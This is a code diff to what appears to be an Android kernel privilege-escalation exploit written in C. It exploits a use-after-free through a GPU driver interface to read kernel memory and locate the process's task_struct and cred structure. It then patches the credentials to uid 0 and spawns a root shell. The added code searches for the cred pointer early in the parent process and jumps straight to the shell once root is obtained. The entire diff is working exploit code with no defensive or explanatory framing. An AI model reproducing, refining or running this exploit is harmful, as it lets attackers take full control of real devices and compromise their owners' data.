@@ -55,6 +55,8 @@
 #define MAX_FOUND_PAGES 10
 
 #define GBUF_TASK_VA         0xb08
+#define GBUF_CRED_PTR        0xb10
+#define GBUF_REAL_CRED_PTR   0xb18
 #define GBUF_TARGET_PID      0x40
 #define GBUF_FOUND_PID       0x300
 #define GBUF_SET_TASKS       0x200
@@ -1141,12 +1143,14 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 static void safe_cred_patch(void)
 {
     uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
+    uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
     int patched = 0;
     uid_t my_uid = getuid();
 
     fprintf(stderr, "[CHILD] ============================================\n");
     fprintf(stderr, "[CHILD] Starting CRED PATCH via UAF\n");
     fprintf(stderr, "[CHILD] task_va from gbuf[0xb08]: 0x%lx\n", (unsigned long)task_va);
+    fprintf(stderr, "[CHILD] cred_ptr from gbuf[0xb10]: 0x%lx\n", (unsigned long)cred_ptr);
 
     if (task_va == 0) {
         fprintf(stderr, "[CHILD] [!] No task_va in gbuf\n");
@@ -1168,6 +1172,17 @@ static void safe_cred_patch(void)
         if (kernel_base == 0)
             kernel_base = get_kernel_base();
         fprintf(stderr, "[CHILD] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
+    }
+
+    // If Parent already found cred_ptr, use it directly
+    if (cred_ptr != 0) {
+        fprintf(stderr, "[CHILD] Using cred_ptr from Parent: 0x%lx\n", (unsigned long)cred_ptr);
+        patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
+        if (getuid() == 0) {
+            fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0) via Parent's cred_ptr\n");
+            patched = 1;
+            goto shell;
+        }
     }
 
     // Centering 8KB buffer around the marker (task_va)
@@ -1231,9 +1246,10 @@ static void safe_cred_patch(void)
     }
     free(big_task_data);
 
+shell:
     if (patched) {
         fprintf(stderr, "[CHILD] [+] Spawning root shell...\n");
-        system("/system/bin/sh");
+        system("id; /system/bin/sh");
         exit(0);
     }
 
@@ -1854,6 +1870,45 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
 
                     fprintf(stderr, "      [!!!] TARGET PID: %d (saved to gbuf[0x40])\n", comm_pid);
                     fprintf(stderr, "      [!!!] TASK VA: 0x%lx (saved to gbuf[0xb08])\n", (unsigned long)current_va);
+
+                    // Aggressive CRED search in Parent immediately
+                    uint8_t *big_data = malloc(8192);
+                    uint64_t r_base = (current_va & ~0xFFFULL) - 4096;
+                    if (gpu_read_task_struct(fd, r_base, big_data, 4096) == 0 &&
+                        gpu_read_task_struct(fd, r_base + 4096, big_data + 4096, 4096) == 0)
+                    {
+                        int c_off = -1;
+                        for (int i = 0; i < 8192 - 8; i++) {
+                            if (memcmp(big_data + i, MARKER_NAME, 8) == 0) {
+                                c_off = i;
+                                break;
+                            }
+                        }
+                        if (c_off != -1) {
+                            uint64_t c_ptr = 0, rc_ptr = 0;
+                            uid_t my_uid = getuid();
+                            for (int off = c_off - 1024; off < c_off + 256; off += 8) {
+                                if (off < 0 || off > 8192 - 8) continue;
+                                uint64_t p = *(uint64_t *)(big_data + off);
+                                if ((p & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                                    uint8_t cc[64];
+                                    if (gpu_read_task_struct(fd, p, cc, 64) == 0) {
+                                        if (*(uint32_t*)(cc+4) == my_uid && *(uint32_t*)cc < 2000) {
+                                            c_ptr = p;
+                                            rc_ptr = p;
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                            if (c_ptr) {
+                                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = c_ptr;
+                                *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR] = rc_ptr;
+                                fprintf(stderr, "      [!!!] CRED FOUND by Parent: 0x%lx (saved to gbuf)\n", (unsigned long)c_ptr);
+                            }
+                        }
+                    }
+                    free(big_data);
 
                     for (int si = 0; si < spray_count; si++)
                     {
